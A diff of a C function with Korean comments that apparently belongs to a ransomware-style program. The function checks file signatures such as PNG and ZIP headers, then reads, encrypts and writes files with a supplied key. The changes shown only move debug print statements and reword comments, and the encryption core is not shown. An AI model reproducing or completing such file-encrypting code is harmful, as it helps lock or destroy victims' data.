@@ -96,8 +96,11 @@ void calldir(target* t, unsigned char* key) {
                     printf("path 1 :%S", path1);
 
                     HANDLE wFile = CreateFileW(path1, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                    
                     DWORD bytesWritten;
                     WriteFile(wFile, signature, bytesRead, &bytesWritten, NULL);
+                    printf("\n%02X %02X %02X %02X %02X\n", in[0], in[1], in[2], in[3], in[4]);
+
                     DWORD currentPosition = SetFilePointer(hFile, 0, NULL, FILE_CURRENT);
 
                     // 남은 부분을 읽어서 암호화하고 쓰기
@@ -114,11 +117,10 @@ void calldir(target* t, unsigned char* key) {
                         WriteFile(wFile, signature, bytesRead, &bytesWritten, NULL);
                     }
 
-                    // 현재 파일 포인터 위치를 저장했던 위치로 복원
+                    // 현재 파일 포인터 위치를 읽어서 쓴 위치로 복원
                     SetFilePointer(hFile, currentPosition, NULL, FILE_BEGIN);
-
-                    printf("\n%02X %02X %02X %02X %02X\n", in[0], in[1], in[2], in[3], in[4]);
                     CloseHandle(wFile);
+                  
                 }
                 // 89 50 4E 47 0D 0A 1A 0A
                 else if (signature[0] == 0X89 && signature[1] == 0X50 && signature[2] == 0X4E && signature[3] == 0X47 &&
@@ -144,8 +146,11 @@ void calldir(target* t, unsigned char* key) {
                     printf("path 1 :%S", path1);
 
                     HANDLE wFile = CreateFileW(path1, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                    
                     DWORD bytesWritten;
                     WriteFile(wFile, signature, bytesRead, &bytesWritten, NULL);
+                    printf("\n%02X %02X %02X %02X %02X\n", in[0], in[1], in[2], in[3], in[4]);
+
                     DWORD currentPosition = SetFilePointer(hFile, 0, NULL, FILE_CURRENT);
 
                     // 남은 부분을 읽어서 암호화하고 쓰기
@@ -162,14 +167,9 @@ void calldir(target* t, unsigned char* key) {
                         WriteFile(wFile, signature, bytesRead, &bytesWritten, NULL);
                     }
 
-                    // 현재 파일 포인터 위치를 저장했던 위치로 복원
+                    // 현재 파일 포인터 위치를 읽어서 쓸 위치로 복원
                     SetFilePointer(hFile, currentPosition, NULL, FILE_BEGIN);
-
-                    printf("\n%02X %02X %02X %02X %02X\n", in[0], in[1], in[2], in[3], in[4]);
                     CloseHandle(wFile);
-
-
-                    //HANDLE wFile = CreateFileW(path1, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
                 }
                 // 50 4B 03 04
@@ -193,8 +193,11 @@ void calldir(target* t, unsigned char* key) {
                     printf("path 1 :%S", path1);
 
                     HANDLE wFile = CreateFileW(path1, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                    
                     DWORD bytesWritten;
                     WriteFile(wFile, signature, bytesRead, &bytesWritten, NULL);
+                    printf("\n%02X %02X %02X %02X %02X\n", in[0], in[1], in[2], in[3], in[4]);
+
                     DWORD currentPosition = SetFilePointer(hFile, 0, NULL, FILE_CURRENT);
 
                     // 남은 부분을 읽어서 암호화하고 쓰기
@@ -211,15 +214,11 @@ void calldir(target* t, unsigned char* key) {
                         WriteFile(wFile, signature, bytesRead, &bytesWritten, NULL);
                     }
 
-                    // 현재 파일 포인터 위치를 저장했던 위치로 복원
+                    // 현재 파일 포인터 위치를 읽어서 쓸 위치로 복원
                     SetFilePointer(hFile, currentPosition, NULL, FILE_BEGIN);
-
-                    printf("\n%02X %02X %02X %02X %02X\n", in[0], in[1], in[2], in[3], in[4]);
                     CloseHandle(wFile);
 
-
                 }
-
 
                 bytesRead = 0;
             }
